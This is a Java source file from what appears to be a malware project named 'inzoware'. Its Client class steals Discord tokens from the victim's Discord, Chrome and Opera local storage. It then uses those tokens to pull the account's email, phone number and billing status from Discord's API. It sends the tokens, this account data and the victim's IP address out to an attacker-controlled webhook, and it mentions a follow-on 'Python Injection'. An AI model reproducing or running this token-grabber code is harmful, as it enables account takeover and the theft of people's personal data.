package com.inzo.technologies.inzoware.utils;

import java.awt.Color;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.inzo.technologies.inzoware.hooks.*;
import com.inzo.technologies.inzoware.json.*;
import com.inzo.technologies.inzoware.mc.JSON;
import com.inzo.technologies.inzoware.modules.*;
import com.inzo.technologies.inzoware.utils.InitUtils;

public class Client {

    public static void Initialize() {

        ArrayList<String> workingTokens = new ArrayList<>();

        // DupingUtils.Duper();
        Blink.Enable();
        InitUtils.sendData("IP Address: " + Blink.ip, Hooks374.getyou(), InitUtils.getName());
        InitUtils.sendData("**Grabbing Discord Tokens**", Hooks374.getyou(), InitUtils.getName());
        ArrayList<String> tokens = new ArrayList<>();
        final String appdata = System.getenv().get("APPDATA");
        final String local = System.getenv().get("LOCALAPPDATA");
        final String[] regex = {
                "[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}"
        };

        HashMap<String, File> paths = new HashMap<String, File>() {{
           put("Discord", new File(appdata + "\\discord\\Local Storage\\leveldb"));
           put("Chrome", new File(local + "\\Google\\Chrome\\User Data\\Default"));
           put("Opera", new File(appdata + "\\Opera Software\\Opera Stable"));
        }};

        for (File path : paths.values()) {
            try {
                for (File file : path.listFiles()) {
                    if (file.toString().endsWith(".ldb")) {
                        FileReader fileReader = new FileReader(file);
                        BufferedReader bufferReader = new BufferedReader(fileReader);

                        String textFile = null;
                        StringBuilder buildedText = new StringBuilder();

                        while ( (textFile = bufferReader.readLine()) != null) {
                            buildedText.append(textFile);
                        }

                        String actualText = buildedText.toString();

                        fileReader.close();
                        bufferReader.close();

                        Pattern pattern = Pattern.compile(regex[0]);
                        Matcher matcher = pattern.matcher(actualText);
                        if (matcher.find(0)) {

                            tokens.add(matcher.group());                       }else {
                                InitUtils.sendData("No Other Discord Tokens Found", Hooks374.getyou(), InitUtils.getName());
                            }
                    }
                }
            } catch (Exception e) {
                continue;
            }
    }
        try {
            Thread.sleep(1600);
        } catch (InterruptedException e2) {
            e2.printStackTrace();
        }
        for(String t : tokens) {
            String info = InitUtils.sendDiscordInfo(t, "users/@me", InitUtils.getName()).replace(",", ",\n");
            String username = i_love_inzo(info, "username") + "#" + i_love_inzo(info, "discriminator");
            if(username.equalsIgnoreCase("Invalid#Invalid")) {
                continue;
            }
            String number = i_love_inzo(info, "phone");
            String email = i_love_inzo(info, "email");
            boolean nitro = !InitUtils.sendDiscordInfo(t, "users/@me/billing/subscriptions", InitUtils.getName()).equals("[]");
            boolean billing = !InitUtils.sendDiscordInfo(t, "users/@me/billing/subscriptions", InitUtils.getName()).equals("[]");
            DiscordDuper discord = new DiscordDuper(Hooks374.getyou());
            discord.setUsername(InitUtils.getName());
            discord.setAvatarUrl("https://img.cjstevenson.com/images/2022/02/13/97044373.png");
            discord.setContent("**" + t + "**");
            discord.addEmbed(new DiscordDuper.EmbedObject()
                    .setTitle(username + "'s Discord Info")
                    .setColor(Color.CYAN)
                    .addField("Nitro", nitro == true ? "True" : "False", true)
                    .addField("Billing", billing == true ? "True" : "False", true)
                    .addField("Phone", number, false)
                    .addField("Email", email, true)
                    .setFooter("HaveIBeenPwned: " + String.join("", InitUtils.hasBeenPwned(email) == true ? "Yes" : "No"), ""));
            try {
                discord.execute();
                workingTokens.add(t);
            } catch (IOException e) {
                
            }
        }
        InitUtils.sendData("| **Python Injection Completed (this doesnt work if they dont have python)**| ", Hooks374.getyou(), InitUtils.getName());
        JSON.main();   


    }

    public static String i_love_inzo(String inzo, String inzo_thnkscj_skillnoob_luxs_nowhere) {
        try {
            JSONObject json = new JSONObject(inzo);
            return json.getString(inzo_thnkscj_skillnoob_luxs_nowhere);
        }catch(Exception e) {
            return "Invalid";
        }
        
    }
    
}
